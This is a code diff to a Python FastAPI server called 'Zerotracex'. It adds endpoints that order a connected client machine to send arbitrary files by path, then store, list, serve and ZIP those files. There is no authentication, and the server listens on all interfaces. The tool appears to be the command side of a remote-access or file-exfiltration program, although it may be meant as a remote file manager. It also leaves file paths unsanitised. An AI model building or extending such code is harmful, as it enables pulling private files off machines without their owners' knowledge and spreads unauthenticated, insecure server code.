@@ -1,5 +1,5 @@
 from fastapi import FastAPI, WebSocket, Request
-from fastapi.responses import HTMLResponse, Response
+from fastapi.responses import HTMLResponse, Response, FileResponse
 from fastapi.staticfiles import StaticFiles
 import uvicorn
 from typing import Dict
@@ -8,6 +8,9 @@ import os
 from datetime import datetime
 import asyncio
 from pathlib import Path
+import shutil
+import zipfile
+import io
 
 from .models.client import ClientData
 from .handlers.file_manager import FileManagerHandler
@@ -15,6 +18,7 @@ from .handlers.file_manager import FileManagerHandler
 # Make app available for import
 app = FastAPI(title="Zerotracex")
 file_manager = FileManagerHandler()
+file_manager.app = app  # Pass the app instance to the handler
 
 # Store connected clients
 clients: Dict[str, ClientData] = {}
@@ -22,6 +26,11 @@ websocket_clients: Dict[str, WebSocket] = {}
 
 # Store last known directory state
 directory_cache: Dict[str, dict] = {}
+
+# Add after existing initialization code
+STORAGE_DIR = "server_storage"
+if not os.path.exists(STORAGE_DIR):
+    os.makedirs(STORAGE_DIR)
 
 @app.websocket("/ws")
 async def websocket_endpoint(websocket: WebSocket):
@@ -73,7 +82,7 @@ async def websocket_endpoint(websocket: WebSocket):
             del websocket_clients[websocket.client.host]
         print(f"[-] WebSocket client disconnected: {client_id}")
 
-@app.get("/", response_class=HTMLResponse)
+@app.get("/")
 async def get_directory(request: Request):
     # For web browser requests, use the connected client's data
     connected_clients = list(clients.keys())
@@ -106,8 +115,11 @@ async def get_directory(request: Request):
         except Exception as e:
             print(f"Error requesting directory contents: {e}")
     
-        html_content = file_manager.generate_directory_listing(client_data, path)
+        # Generate HTML content
+        html_content = await file_manager.generate_directory_listing(client_data, path)
         return HTMLResponse(content=html_content)
+    
+    return HTMLResponse(content="Client not connected", status_code=404)
 
 @app.get("/download")
 async def download_file(request: Request, path: str):
@@ -150,6 +162,146 @@ async def download_file(request: Request, path: str):
             return HTMLResponse(content="Download error", status_code=500)
     
     return HTMLResponse(content="Client not connected", status_code=404)
+
+@app.post("/save")
+async def save_file(request: Request, path: str):
+    connected_clients = list(clients.keys())
+    if not connected_clients:
+        return HTMLResponse(content="No clients connected", status_code=404)
+    
+    client_ip = connected_clients[0]
+    websocket = websocket_clients.get(client_ip)
+    client_data = clients[client_ip]
+    
+    if websocket:
+        try:
+            # Clear any previous file data
+            client_data.last_file_data = None
+            
+            # Request file from client
+            await websocket.send_text(f"DOWNLOAD:{path}")
+            
+            # Wait for file data response with timeout
+            for _ in range(50):  # 5 seconds timeout
+                if client_data.last_file_data is not None:
+                    file_data = client_data.last_file_data
+                    client_data.last_file_data = None  # Clear after use
+                    
+                    filename = os.path.basename(path)
+                    save_path = os.path.join(STORAGE_DIR, filename)
+                    
+                    # Save file with timestamp to avoid duplicates
+                    if os.path.exists(save_path):
+                        name, ext = os.path.splitext(filename)
+                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+                        save_path = os.path.join(STORAGE_DIR, f"{name}_{timestamp}{ext}")
+                    
+                    with open(save_path, 'wb') as f:
+                        f.write(file_data)
+                    
+                    return Response(content="File saved successfully")
+                await asyncio.sleep(0.1)
+            
+            return HTMLResponse(content="Save timeout", status_code=408)
+            
+        except Exception as e:
+            print(f"Error saving file: {e}")
+            return HTMLResponse(content="Save error", status_code=500)
+    
+    return HTMLResponse(content="Client not connected", status_code=404)
+
+@app.get("/saved-files")
+async def list_saved_files():
+    try:
+        files = []
+        for filename in os.listdir(STORAGE_DIR):
+            file_path = os.path.join(STORAGE_DIR, filename)
+            stat = os.stat(file_path)
+            files.append({
+                'name': filename,
+                'size': stat.st_size,
+                'mtime': stat.st_mtime,
+                'path': f"/download-saved/{filename}"
+            })
+        return files
+    except Exception as e:
+        print(f"Error listing saved files: {e}")
+        return []
+
+@app.get("/download-saved/{filename}")
+async def download_saved_file(filename: str):
+    try:
+        file_path = os.path.join(STORAGE_DIR, filename)
+        if os.path.exists(file_path):
+            return FileResponse(
+                path=file_path,
+                filename=filename,
+                media_type='application/octet-stream'
+            )
+        return HTMLResponse(content="File not found", status_code=404)
+    except Exception as e:
+        print(f"Error downloading saved file: {e}")
+        return HTMLResponse(content="Download error", status_code=500)
+
+@app.post("/download-zip")
+async def download_zip(request: Request):
+    try:
+        # Get file paths from request body
+        body = await request.json()
+        paths = body.get('paths', [])
+        
+        if not paths:
+            return HTMLResponse(content="No files selected", status_code=400)
+            
+        # Create ZIP file in memory
+        zip_buffer = io.BytesIO()
+        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
+            # Handle both regular and saved files
+            for path in paths:
+                if path.startswith('/download-saved/'):
+                    # Handle saved files
+                    filename = path.replace('/download-saved/', '')
+                    file_path = os.path.join(STORAGE_DIR, filename)
+                    if os.path.exists(file_path):
+                        zip_file.write(file_path, filename)
+                else:
+                    # Handle regular files
+                    client_ip = list(clients.keys())[0]
+                    websocket = websocket_clients.get(client_ip)
+                    client_data = clients[client_ip]
+                    
+                    if websocket:
+                        # Clear previous file data
+                        client_data.last_file_data = None
+                        
+                        # Request file from client
+                        await websocket.send_text(f"DOWNLOAD:{path}")
+                        
+                        # Wait for file data
+                        for _ in range(50):  # 5 seconds timeout
+                            if client_data.last_file_data is not None:
+                                filename = os.path.basename(path)
+                                zip_file.writestr(filename, client_data.last_file_data)
+                                client_data.last_file_data = None
+                                break
+                            await asyncio.sleep(0.1)
+        
+        # Get ZIP data
+        zip_data = zip_buffer.getvalue()
+        zip_buffer.close()
+        
+        # Return ZIP file
+        return Response(
+            content=zip_data,
+            media_type='application/zip',
+            headers={
+                'Content-Disposition': f'attachment; filename="selected_files.zip"'
+            }
+        )
+        
+    except Exception as e:
+        print(f"Error creating ZIP: {e}")
+        return HTMLResponse(content="Error creating ZIP file", status_code=500)
 
 def start(host="0.0.0.0", port=8080):
     print(f"[*] Server starting on http://{host}:{port}")
